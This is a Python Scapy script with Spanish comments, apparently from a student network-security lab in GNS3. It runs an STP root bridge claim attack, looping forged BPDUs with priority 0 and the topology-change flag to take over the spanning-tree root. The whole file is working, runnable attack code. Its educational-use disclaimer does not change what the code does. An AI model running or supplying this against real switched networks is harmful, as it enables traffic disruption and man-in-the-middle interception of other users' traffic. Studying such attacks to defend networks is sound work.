#!/usr/bin/env python3
# STP Root Claim Attack - Laboratorio de Seguridad de Redes
# Autor: Estudiante de Ciberseguridad
# Entorno: GNS3 (Ambiente Controlado)
# ADVERTENCIA: Uso exclusivamente educativo en entornos controlados.

from scapy.all import *
import time, sys, os, argparse


def stp_root_attack(iface='eth0', interval=2.0, priority=0, vlan_id=1):
    """
    Envia BPDUs con prioridad minima para reclamar ser Root Bridge STP.
    Parametros:
        iface    (str)  : Interfaz de red
        interval (float): Segundos entre BPDUs (default: 2.0 = hello time STP)
        priority (int)  : Prioridad del bridge (0 = mas baja = gana) (default: 0)
        vlan_id  (int)  : VLAN ID objetivo (default: 1)
    """
    attacker_mac = get_if_hwaddr(iface)
    print("=" * 60)
    print("  STP ROOT CLAIM ATTACK - Laboratorio GNS3")
    print(f"  Interfaz: {iface} | MAC: {attacker_mac}")
    print(f"  Prioridad: {priority} (0 = mas baja, gana eleccion STP)")
    print(f"  VLAN: {vlan_id} | Intervalo: {interval}s")
    print("=" * 60)
    print("[*] Enviando BPDUs maliciosos para reclamar Root Bridge...")
    print("[*] Impacto: reconvergencia STP, caida momentanea de trafico")

    bpdu = (
        Ether(dst='01:80:c2:00:00:00', src=attacker_mac) /
        LLC(dsap=0x42, ssap=0x42, ctrl=0x03) /
        STP(
            proto=0,
            version=0,
            bpdutype=0x00,        # Configuration BPDU
            bpduflags=0x01,       # Topology Change
            rootid=priority,      # Bridge ID raiz (nosotros, prioridad 0)
            rootmac=attacker_mac,
            pathcost=0,           # Costo 0 = camino directo
            bridgeid=priority,
            bridgemac=attacker_mac,
            portid=0x8001,
            age=0,
            maxage=20,
            hellotime=2,
            fwddelay=15
        )
    )

    sent = 0
    start_time = time.time()
    try:
        while True:
            sendp(bpdu, iface=iface, verbose=False)
            sent += 1
            elapsed = time.time() - start_time
            print(f"\r  [+] BPDUs enviados: {sent} | Tiempo: {elapsed:.1f}s", end='', flush=True)
            time.sleep(interval)
    except KeyboardInterrupt:
        elapsed = time.time() - start_time
        print(f"\n\n[!] Ataque detenido.")
        print(f"[+] BPDUs enviados: {sent} | Tiempo: {elapsed:.2f}s")
        print(f"[!] La topologia STP puede tardar en recuperarse.")


if __name__ == '__main__':
    if os.geteuid() != 0:
        sys.exit("[-] Requiere privilegios root.")
    parser = argparse.ArgumentParser(description='STP Root Claim Attack - GNS3')
    parser.add_argument('-i', '--interface', default='eth0')
    parser.add_argument('--interval', type=float, default=2.0)
    parser.add_argument('--priority', type=int, default=0)
    parser.add_argument('--vlan', type=int, default=1)
    args = parser.parse_args()
    stp_root_attack(args.interface, args.interval, args.priority, args.vlan)
